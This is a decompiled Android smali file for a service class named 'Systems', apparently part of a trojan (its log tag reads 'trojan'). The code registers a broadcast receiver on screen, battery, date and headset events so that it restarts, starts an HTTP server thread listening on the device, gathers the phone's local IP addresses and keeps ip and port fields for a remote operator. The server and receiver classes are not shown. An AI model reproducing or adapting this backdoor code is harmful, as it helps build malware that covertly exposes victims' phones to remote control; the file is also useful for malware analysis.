.class public Lcom/systemt/Systems;
.super Landroid/app/Service;
.source "Systems.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/systemt/Systems$HttpResponseThread;,
        Lcom/systemt/Systems$HttpServerThread;
    }
.end annotation


# static fields
.field private static TAG:Ljava/lang/String;

.field public static ip:Ljava/lang/String;

.field public static port:Ljava/lang/String;


# instance fields
.field private httpServerSocket:Ljava/net/ServerSocket;

.field httpServerThread:Lcom/systemt/Systems$HttpServerThread;

.field private msgLog:Ljava/lang/String;

.field private receiver:Landroid/content/BroadcastReceiver;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 24
    const-string v0, "trojan"

    sput-object v0, Lcom/systemt/Systems;->TAG:Ljava/lang/String;

    .line 28
    const-string v0, ""

    sput-object v0, Lcom/systemt/Systems;->ip:Ljava/lang/String;

    .line 29
    const-string v0, ""

    sput-object v0, Lcom/systemt/Systems;->port:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .prologue
    .line 22
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 27
    const-string v0, ""

    iput-object v0, p0, Lcom/systemt/Systems;->msgLog:Ljava/lang/String;

    return-void
.end method

.method static synthetic access$100(Lcom/systemt/Systems;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 22
    invoke-direct {p0}, Lcom/systemt/Systems;->getIpAddress()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method static synthetic access$200(Lcom/systemt/Systems;)Ljava/net/ServerSocket;
    .locals 1

    .prologue
    .line 22
    iget-object v0, p0, Lcom/systemt/Systems;->httpServerSocket:Ljava/net/ServerSocket;

    return-object v0
.end method

.method static synthetic access$202(Lcom/systemt/Systems;Ljava/net/ServerSocket;)Ljava/net/ServerSocket;
    .locals 0

    .prologue
    .line 22
    iput-object p1, p0, Lcom/systemt/Systems;->httpServerSocket:Ljava/net/ServerSocket;

    return-object p1
.end method

.method static synthetic access$300(Lcom/systemt/Systems;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 22
    iget-object v0, p0, Lcom/systemt/Systems;->msgLog:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$302(Lcom/systemt/Systems;Ljava/lang/String;)Ljava/lang/String;
    .locals 0

    .prologue
    .line 22
    iput-object p1, p0, Lcom/systemt/Systems;->msgLog:Ljava/lang/String;

    return-object p1
.end method

.method private getIpAddress()Ljava/lang/String;
    .locals 6

    .prologue
    .line 90
    const-string v1, ""

    .line 92
    :try_start_0
    invoke-static {}, Ljava/net/NetworkInterface;->getNetworkInterfaces()Ljava/util/Enumeration;

    move-result-object v2

    .line 93
    :cond_0
    invoke-interface {v2}, Ljava/util/Enumeration;->hasMoreElements()Z

    move-result v0

    if-eqz v0, :cond_1

    .line 94
    invoke-interface {v2}, Ljava/util/Enumeration;->nextElement()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/net/NetworkInterface;

    .line 95
    invoke-virtual {v0}, Ljava/net/NetworkInterface;->getInetAddresses()Ljava/util/Enumeration;

    move-result-object v3

    .line 96
    :goto_0
    invoke-interface {v3}, Ljava/util/Enumeration;->hasMoreElements()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 97
    invoke-interface {v3}, Ljava/util/Enumeration;->nextElement()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/net/InetAddress;

    .line 98
    invoke-virtual {v0}, Ljava/net/InetAddress;->isSiteLocalAddress()Z

    move-result v4

    if-eqz v4, :cond_2

    .line 99
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "SiteLocalAddress: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v0}, Ljava/net/InetAddress;->getHostAddress()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v4, "\n"

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_0
    .catch Ljava/net/SocketException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    :goto_1
    move-object v1, v0

    .line 101
    goto :goto_0

    :cond_1
    move-object v0, v1

    .line 108
    :goto_2
    return-object v0

    .line 103
    :catch_0
    move-exception v0

    .line 105
    invoke-virtual {v0}, Ljava/net/SocketException;->printStackTrace()V

    .line 106
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "Something Wrong! "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v0}, Ljava/net/SocketException;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "\n"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_2

    :cond_2
    move-object v0, v1

    goto :goto_1
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    .prologue
    .line 34
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 2

    .prologue
    .line 40
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 41
    sget-object v0, Lcom/systemt/Systems;->TAG:Ljava/lang/String;

    const-string v1, "service oncreate"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 43
    new-instance v0, Landroid/content/IntentFilter;

    const-string v1, "android.intent.action.BATTERY_CHANGED"

    invoke-direct {v0, v1}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 44
    const-string v1, "android.intent.action.DATE_CHANGED"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 45
    const-string v1, "android.intent.action.HEADSET_PLUG"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 46
    const-string v1, "android.intent.action.SCREEN_ON"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 47
    const-string v1, "android.intent.action.SCREEN_OFF"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 49
    new-instance v1, Lcom/systemt/ReceiverBoot;

    invoke-direct {v1}, Lcom/systemt/ReceiverBoot;-><init>()V

    iput-object v1, p0, Lcom/systemt/Systems;->receiver:Landroid/content/BroadcastReceiver;

    .line 50
    iget-object v1, p0, Lcom/systemt/Systems;->receiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v1, v0}, Lcom/systemt/Systems;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 52
    new-instance v0, Lcom/systemt/Systems$HttpServerThread;

    const/4 v1, 0x0

    invoke-direct {v0, p0, v1}, Lcom/systemt/Systems$HttpServerThread;-><init>(Lcom/systemt/Systems;Lcom/systemt/Systems$1;)V

    iput-object v0, p0, Lcom/systemt/Systems;->httpServerThread:Lcom/systemt/Systems$HttpServerThread;

    .line 53
    iget-object v0, p0, Lcom/systemt/Systems;->httpServerThread:Lcom/systemt/Systems$HttpServerThread;

    invoke-virtual {v0}, Lcom/systemt/Systems$HttpServerThread;->start()V

    .line 54
    return-void
.end method

.method public onDestroy()V
    .locals 2

    .prologue
    .line 78
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 79
    iget-object v0, p0, Lcom/systemt/Systems;->receiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v0}, Lcom/systemt/Systems;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 80
    sget-object v0, Lcom/systemt/Systems;->TAG:Ljava/lang/String;

    const-string v1, "service destroy"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 82
    iget-object v0, p0, Lcom/systemt/Systems;->httpServerSocket:Ljava/net/ServerSocket;

    if-eqz v0, :cond_0

    .line 84
    :try_start_0
    iget-object v0, p0, Lcom/systemt/Systems;->httpServerSocket:Ljava/net/ServerSocket;

    invoke-virtual {v0}, Ljava/net/ServerSocket;->close()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 87
    :cond_0
    :goto_0
    return-void

    .line 85
    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 6

    .prologue
    .line 59
    sget-object v0, Lcom/systemt/Systems;->TAG:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "service onStartCommand "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Lcom/systemt/Systems;->ip:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, " "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Lcom/systemt/Systems;->port:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 61
    new-instance v0, Lcom/systemt/Systems$1;

    const-wide/16 v2, 0x7d0

    const-wide/16 v4, 0x64

    move-object v1, p0

    invoke-direct/range {v0 .. v5}, Lcom/systemt/Systems$1;-><init>(Lcom/systemt/Systems;JJ)V

    .line 71
    invoke-virtual {v0}, Lcom/systemt/Systems$1;->start()Landroid/os/CountDownTimer;

    .line 72
    invoke-super {p0, p1, p2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I

    move-result v0

    return v0
.end method
